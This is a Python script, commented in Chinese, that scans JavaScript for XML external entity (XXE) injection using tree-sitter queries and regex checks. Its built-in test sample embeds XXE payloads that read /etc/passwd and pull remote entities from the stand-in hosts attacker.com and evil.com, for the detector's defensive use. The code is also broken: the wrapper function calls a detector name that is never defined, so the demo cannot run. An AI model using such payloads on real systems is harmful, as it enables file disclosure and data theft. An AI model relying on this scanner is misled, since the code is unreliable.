import os
import re
from tree_sitter import Language, Parser

from .config_path import language_path

# 加载JavaScript语言
LANGUAGES = {
    'javascript': Language(language_path, 'javascript'),
}

# 定义JavaScript的XXE漏洞模式
XXE_VULNERABILITIES = {
    'javascript': [
        {
            'query': '''
                (call_expression
                    function: (member_expression
                        object: (identifier) @object
                        property: (property_identifier) @property
                    )
                    arguments: (arguments (string) @xml_string)
                ) @call
            ''',
            'pattern': r'^(XMLParser|DOMParser|ActiveXObject)$',
            'property_pattern': r'^(parseFromString|new)$',
            'message': 'XML解析器调用发现'
        },
        {
            'query': '''
                (call_expression
                    function: (identifier) @func_name
                    arguments: (arguments (string) @xml_string)
                ) @call
            ''',
            'pattern': r'^(parseXml|parseXML|loadXML|parseFromString)$',
            'message': 'XML解析函数调用'
        },
        {
            'query': '''
                (new_expression
                    constructor: (identifier) @constructor
                    arguments: (arguments (string) @xml_string)
                ) @new
            ''',
            'pattern': r'^(DOMParser|ActiveXObject|MSXML2\.DOMDocument|MSXML2\.XMLHTTP)$',
            'message': 'XML相关对象实例化'
        },
        {
            'query': '''
                (call_expression
                    function: (member_expression
                        object: (_) @object
                        property: (property_identifier) @property
                    )
                    arguments: (arguments (string) @xml_string)
                ) @call
            ''',
            'pattern': r'^(responseXML|responseText|xml)$',
            'property_pattern': r'^(loadXML|parse|parseFromString)$',
            'message': 'XML响应处理'
        },
        {
            'query': '''
                (assignment_expression
                    left: (member_expression
                        object: (identifier) @object
                        property: (property_identifier) @property
                    )
                    right: (string) @xml_string
                ) @assignment
            ''',
            'pattern': r'^(parser|xmlParser|domParser)$',
            'property_pattern': r'^(xml|xmlText|xmlContent)$',
            'message': 'XML内容赋值'
        },
        {
            'query': '''
                (call_expression
                    function: (member_expression
                        object: (_) @object
                        property: (property_identifier) @property
                    )
                    arguments: (arguments) @args
                ) @call
            ''',
            'pattern': r'^(document|xmlDoc|parser)$',
            'property_pattern': r'^(load|loadXML|async|load|open)$',
            'message': 'XML加载方法调用'
        },
        {
            'query': '''
                (call_expression
                    function: (member_expression
                        object: (identifier) @object
                        property: (property_identifier) @property
                    )
                    arguments: (arguments) @args
                ) @call
            ''',
            'pattern': r'^(XMLHttpRequest|ActiveXObject)$',
            'property_pattern': r'^(open|send)$',
            'message': 'AJAX请求调用'
        }
    ]
}


def detect_js_xxe_ext_vulnerabilities(code, language='javascript'):
    """
    检测JavaScript代码中XML外部实体注入漏洞

    Args:
        code: JavaScript源代码字符串
        language: 语言类型，默认为'javascript'

    Returns:
        list: 检测结果列表
    """
    if language not in LANGUAGES:
        return []

    # 初始化解析器
    parser = Parser()
    parser.set_language(LANGUAGES[language])

    # 解析代码
    tree = parser.parse(bytes(code, 'utf8'))
    root = tree.root_node

    vulnerabilities = []
    xml_operations = []  # 存储所有XML操作

    # 收集所有XML相关操作
    for query_info in XXE_VULNERABILITIES[language]:
        try:
            query = LANGUAGES[language].query(query_info['query'])
            captures = query.captures(root)

            current_capture = {}
            for node, tag in captures:
                if tag in ['object', 'func_name', 'constructor']:
                    obj_name = node.text.decode('utf8')
                    pattern = query_info.get('pattern', '')
                    if pattern and re.match(pattern, obj_name, re.IGNORECASE):
                        current_capture['object'] = obj_name
                        current_capture['node'] = node.parent
                        current_capture['line'] = node.start_point[0] + 1

                elif tag == 'property':
                    prop_name = node.text.decode('utf8')
                    prop_pattern = query_info.get('property_pattern', '')
                    if (not prop_pattern or
                            re.match(prop_pattern, prop_name, re.IGNORECASE)):
                        current_capture['property'] = prop_name

                elif tag in ['xml_string', 'args']:
                    current_capture['arguments'] = node.text.decode('utf8')
                    current_capture['arguments_node'] = node

                elif tag in ['call', 'assignment', 'new'] and current_capture:
                    # 完成一个完整的捕获
                    if 'object' in current_capture:
                        # 获取完整的代码片段
                        code_snippet = node.text.decode('utf8')

                        xml_operations.append({
                            'type': 'xml_operation',
                            'line': current_capture['line'],
                            'object': current_capture.get('object', ''),
                            'property': current_capture.get('property', ''),
                            'arguments': current_capture.get('arguments', ''),
                            'code_snippet': code_snippet,
                            'node': node,
                            'message': query_info['message']
                        })
                    current_capture = {}

        except Exception as e:
            print(f"查询错误 {query_info.get('message')}: {e}")
            continue

    # 分析漏洞
    for operation in xml_operations:
        line = operation['line']
        code_snippet = operation['code_snippet']
        arguments = operation.get('arguments', '')

        # 检查是否存在外部实体引用
        has_external_entity = False
        is_safe = False

        # 检查XML内容中是否包含外部实体
        if arguments and is_xml_content(arguments):
            # 检查DOCTYPE声明
            if re.search(r'<!DOCTYPE', arguments, re.IGNORECASE):
                # 检查外部实体引用
                if re.search(r'<!ENTITY.*SYSTEM.*("|\')', arguments, re.IGNORECASE):
                    has_external_entity = True

                    # 检查是否禁用了外部实体
                    if re.search(r'resolveExternalEntities\s*:\s*false', code_snippet, re.IGNORECASE):
                        is_safe = True
                    elif re.search(r'\.resolveExternalEntities\s*=\s*false', code_snippet, re.IGNORECASE):
                        is_safe = True
                    # 检查其他安全配置
                    elif re.search(r'secure\s*:\s*true', code_snippet, re.IGNORECASE):
                        is_safe = True
                    elif re.search(r'noEnt\s*:\s*true', code_snippet, re.IGNORECASE):
                        is_safe = True

        # 检查是否使用了不安全的ActiveX对象
        if 'ActiveXObject' in operation['object']:
            # 检查MSXML版本 - 某些版本默认不安全
            if re.search(r'MSXML2\.DOMDocument', code_snippet, re.IGNORECASE):
                # 检查是否设置了安全属性
                if not re.search(r'resolveExternalEntities\s*=\s*false', code_snippet, re.IGNORECASE):
                    has_external_entity = True

        # 检查XMLHttpRequest的使用
        if operation['object'] == 'XMLHttpRequest' and operation['property'] == 'open':
            # 检查是否使用了不安全的响应类型
            if re.search(r'responseType\s*=\s*["\']document["\']', code_snippet, re.IGNORECASE):
                has_external_entity = True

        # 如果存在外部实体且没有安全配置，报告漏洞
        if has_external_entity and not is_safe:
            vulnerabilities.append({
                'line': line,
                'message': f'XXE漏洞: {operation["message"]}',
                'code_snippet': code_snippet,
                'vulnerability_type': 'XML外部实体注入',
                'severity': '高危',
                'details': '检测到可能不安全的XML解析，可能允许外部实体注入'
            })

    return sorted(vulnerabilities, key=lambda x: x['line'])


def is_xml_content(text):
    """
    检查文本内容是否为XML格式

    Args:
        text: 文本内容

    Returns:
        bool: 是否为XML内容
    """
    if not text:
        return False

    # 检查XML特征
    xml_indicators = [
        r'<\?xml',
        r'<!DOCTYPE',
        r'<[a-zA-Z_][a-zA-Z0-9_]*:',
        r'<[a-zA-Z_][a-zA-Z0-9_]*\s',
        r'</[a-zA-Z_][a-zA-Z0-9_]*>'
    ]

    for pattern in xml_indicators:
        if re.search(pattern, text, re.IGNORECASE):
            return True

    return False


def analyze_js_code(code_string):
    """
    分析JavaScript代码字符串中的XXE漏洞

    Args:
        code_string: JavaScript源代码字符串

    Returns:
        list: 检测结果列表
    """
    return detect_js_xxe_vulnerabilities(code_string, 'javascript')


# 示例使用
if __name__ == "__main__":
    # 测试JavaScript代码
    test_js_code = """
// 存在XXE漏洞的代码示例
const parser = new DOMParser();
const xmlString = '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>';
const xmlDoc = parser.parseFromString(xmlString, "text/xml");

// 不安全的ActiveX对象使用
var xmlDoc = new ActiveXObject("MSXML2.DOMDocument");
xmlDoc.async = false;
xmlDoc.loadXML('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]>');

// 不安全的XMLHttpRequest
var xhr = new XMLHttpRequest();
xhr.open("GET", "data.xml", false);
xhr.responseType = "document";
xhr.send();
var xmlDoc = xhr.responseXML;

// 使用第三方库的不安全XML解析
const result = parseXml('<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/xxe"> %remote;]>');

// 相对安全的配置 - 禁用外部实体
const safeParser = new DOMParser();
const safeXml = '<root>Safe content</root>';
const safeDoc = parser.parseFromString(safeXml, "text/xml");

// 安全配置示例
var safeXmlDoc = new ActiveXObject("MSXML2.DOMDocument");
safeXmlDoc.resolveExternalEntities = false;
safeXmlDoc.loadXML('<root>safe</root>');

// 使用fetch API但处理XML响应
fetch('data.xml')
    .then(response => response.text())
    .then(xmlText => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(xmlText, "text/xml");
        // 潜在风险：如果xmlText包含恶意DOCTYPE
    });

// 边缘情况：注释中的XML
/* const maliciousXml = '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' */

// 字符串拼接的XML
const userInput = getUserInput();
const dynamicXml = '<!DOCTYPE root><root>' + userInput + '</root>';
const dynamicDoc = parser.parseFromString(dynamicXml, "text/xml");
"""

    print("=" * 60)
    print("JavaScript XXE漏洞检测")
    print("=" * 60)

    results = analyze_js_code(test_js_code)

    if results:
        print(f"检测到 {len(results)} 个漏洞:")
        for i, vuln in enumerate(results, 1):
            print(f"\n{i}. 行号 {vuln['line']}: {vuln['message']}")
            print(f"   代码片段: {vuln['code_snippet'][:100]}...")
            print(f"   严重程度: {vuln['severity']}")
            print(f"   详情: {vuln['details']}")
    else:
        print("未检测到XXE漏洞")